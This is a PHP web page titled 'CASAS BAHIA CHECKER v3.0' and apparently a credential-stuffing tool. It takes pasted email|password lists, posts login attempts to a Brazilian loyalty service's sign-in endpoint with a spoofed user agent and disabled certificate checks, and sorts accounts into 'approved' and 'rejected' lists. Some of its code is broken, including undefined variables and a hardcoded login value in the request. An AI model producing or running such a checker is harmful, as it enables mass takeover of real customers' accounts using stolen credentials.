<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en">
<head>
	<!-- no cache headers -->
	<meta http-equiv="Pragma" content="no-cache" />
	<meta http-equiv="Expires" content="-1" />
	<meta http-equiv="Cache-Control" content="no-cache" />
	<!-- end no cache headers -->
	<title>Technology Checker</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style>
			body
		{
			background-color: #FFD777;
			font-size: 9pt;
			font-family:Verdana;
			line-height:12pt;
			color: #FFFFFF;
		}
			body,td,th {
			color: #FFFFFF;
		}
		h2
		{
			color: #FFFFFF;
		}
		h1 {
			padding: 10px 15px;
			color: red;
		}

		.main-content {
				width: 70%; height: 380px;margin: auto; background: #FFFFFF;      border-radius: 5px 5px 5px 5px; box-shadow: 0 0 3px rgba(0, 0, 0, 0.5); min-height: 380px;      position: relative;
		}
		textarea, input {
				border-radius: 5px 5px 5px 5px;
		}
		input {
				height: 30px;width: 100px;text-align: center;o
		}
			
			
		.button {
			   
		}
		.submit-button
				{
						background: #FFD777;
						border:solid 1px #FFD777;
						border-radius:5px;
								-moz-border-radius: 5px;
								-webkit-border-radius: 5px;
						-moz-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
						-webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
						text-shadow: 0 -1px 1px rgba(0,0,0,0.25);
						border-bottom: 1px solid rgba(0,0,0,0.25);
						position: relative;
						color:#FFF;
						display: inline-block;
						cursor:pointer;
						font-size:13px;
						padding:3px 8px;
						height: 30px;width: 120px;
				}
        .submit-button:hover {
        background:#82D051;border:solid 1px #86CC50;
        height: 30px;width: 120px;      }
 
		#show {
				width: 70%;margin: auto;padding: 10px 10px;
		}

		.business{
			font-weight:bold;
			color:yellow;
		}
		.premier{
			font-weight:bold;
			color:#00FF00;
		}
		.verified{
			font-weight:bold;
			color:#006DB0;
		}
		.fieldset{
			border: 1px dashed #FFFFFF;
			margin-top: 20px;
		}
		.tvmit_live{
			border: 1px dashed #FFFFFF;
			color:yellow;
			font-weight:bold;
		}
		.tvmit_die{
			border: 1px dashed #FFFFFF;
			color:red;
			font-weight:bold;
		}
		#result{
			display:none;
		}
	</style>
	<script type="text/javascript">
    function pushDie(str){
        document.getElementById('listDie').innerHTML += '<div>' + str + '</div>';
    }
    function pushLive(str){
        document.getElementById('listLive').innerHTML += '<div>' + str + '</div>';
    }
    function pushCant(str){
        document.getElementById('listCant').innerHTML += '<div>' + str + '</div>';
    }

</script>
</head>
<?php
function curl($url,$post="",$header=false, $ref=true) {  
	$ch = curl_init();
	if($post) {
		curl_setopt($ch, CURLOPT_POST ,0);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
	}
	curl_setopt($ch, CURLOPT_URL, $url); 
	curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Requested-With: XMLHttpRequest")); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt'); 
	if($ref) { 
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.dotz.com.br');
    }
	curl_setopt($ch, CURLOPT_HEADER,1); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); 
	print $result = curl_exec($ch); 
	curl_close ($ch); 
	return $result;
}
function array_remove_empty($arr){
    $narr = array();
    while(list($key, $val) = each($arr)){
        if (is_array($val)){
            $val = array_remove_empty($val);
            // does the result array contain anything?
            if (count($val)!=0){
                // yes :-)
                $narr[$key] = trim($val);
            }
        }
        else {
            if (trim($val) != ""){
                $narr[$key] = trim($val);
            }
        }
    }
    unset($arr);
    return $narr;
}
function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
function inStr($s,$as){ 
        $s=strtoupper($s); 
        if(!is_array($as)) $as=array($as); 
        for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true; 
        return false; 
} 

function xflush()
{
    static $output_handler = null;
    if ($output_handler === null) {
        $output_handler = @ini_get('output_handler');
    }
    if ($output_handler == 'ob_gzhandler') {
        return;
    }
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {
        @ob_flush();
    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {
        @ob_end_flush();
        @ob_start();
    }
}

function pushDie($str)
{
    echo '<script type="text/javascript">pushDie(\'' . $str . '\');</script>';
    xflush();
}
function pushLive($str)
{
	echo '<script type="text/javascript">pushLive(\'' . $str . '\');</script>';
    xflush();
}
function pushCant($str)
{
    echo '<script type="text/javascript">pushCant(\'' . $str . '\');</script>';
    xflush();
}
if(isset($_POST['submit'])) {
	$mp = $_POST['mp'];
	$delim = $_POST['delim'];
	$mail = $_POST['mail'];
	$pwd = $_POST['pwd'];
}
?>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<body>
<h1 align="center" style="color:#fff;">CASAS BAHIA CHECKER v3.0</h1>
<form method="post" name="frmMain">
<div align="center"><textarea name="mp" cols="90" rows="10"><?php if(isset($mp)) echo $mp; else echo 'admin@admin.com|minhasenha';?></textarea><br />
<br />
<input type="submit" value="DETONAR" name="submit" onClick="mpFilter();" />
</div>
<br />
</form>
<?php
//
if(isset($_POST['submit'])){
?>

	<br>
    <br>
	<=============================TECHNOLOGY CHECKER v3.0=============================>
	<div>APROVADAS :</div>
    <div id="listLive"></div>
	<=============================TECHNOLOGY CHECKER v3.0=============================>
	<div>REPROVADAS:</div>
    <div id="listDie"></div>
	<=============================TECHNOLOGY CHECKER v3.0=============================>
	<!--<div>List Socks DIE|BLACKLIST:</div>
    <div id="listDie"></div>
    <hr /> -->
    <div>FALHA GRAVE!!:</div>
    <div id="listCant"></div>
    <hr />
	
<?php
	xflush();
	$mps = array_remove_empty(array_unique(explode("\n",trim($mp))));
	$total = count($mps);
	$live = $die = $cant = array();
	$checked = 0;
	foreach($mps AS $z => $mp){
		set_time_limit(0);
		$checked++;
		//$head = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8";
		$cookie = "kingbilly_".rand(100000, 999999).".txt";
		$xxxx = explode("|",$mp);
		$email = trim($xxxx[0]);
		$pass = trim($xxxx[1]);
			// check
			

		  
		    $url2 = "https://www.dotz.com.br/?mobile=true";
	      //$var2 = 'app=3F09DF22-33A6-421B-B5A8-EFDF77F2A475&identifier='.$email.'';
			$page2 = curl($url2,$cookie);
			
			  $url1 = "https://www.dotz.com.br/Selecione-Sua-Regiao.aspx?cityId={45228DC4-5DE4-41D3-A8FF-4C33F131FF8F}";
	      //$var2 = 'app=3F09DF22-33A6-421B-B5A8-EFDF77F2A475&identifier='.$email.'';
			$page1 = curl($url1,$cookie);
		  
		  
			
		    $url = "http://sso.dotz.com.br/Login/Authenticate";
			$var = 'identifier=02046254406&password=133023&questionAnswer=07&app=F0C25F07-F7DF-468E-BBE4-CFA3CC9AE8B0';
			$page = curl($url,$var, $cookie);
			
		  //$estado = getStr($page,'"Estado":',',');
		  //echo "<textarea>".$page."</textarea>" ;
			if(inStr($page, '"Erro":false')){
				$xyz = "<b style=\"color:chartreuse\">Aprovada ==></b> $email | $pass | $cidade | $estado | #TechnologyChecker";
				$live[] = "Live ==> $email | $pass";
				pushLive($xyz);
			} elseif(inStr($page, '"Erro":true')) {
				$xyz = "<b style=\"color:red\">Reprovada  ==></b> $email | $pass";
				$die[] = "Reprovada ==> $email | $pass";
				pushDie($xyz);
			} else {
				$xyz = "<b style=\"color:red\">Erro Grave!</b> | $email | $pass ";
				$cant[] = "Erro Grave! | $email | $pass";	
				pushCant($xyz);
			}
		@unlink("c/".$cookie);
		xflush();
	}
	xflush();
	echo "<center><h3>Aprovadas: " . count($live) . "</h3>";
}
?>
<center>Technology Checker V3.0</center>
</body>
</html>